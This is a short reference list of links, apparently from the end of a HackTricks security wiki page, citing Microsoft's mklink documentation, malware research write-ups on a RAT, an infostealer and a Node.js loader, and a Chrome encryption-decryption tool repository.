- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
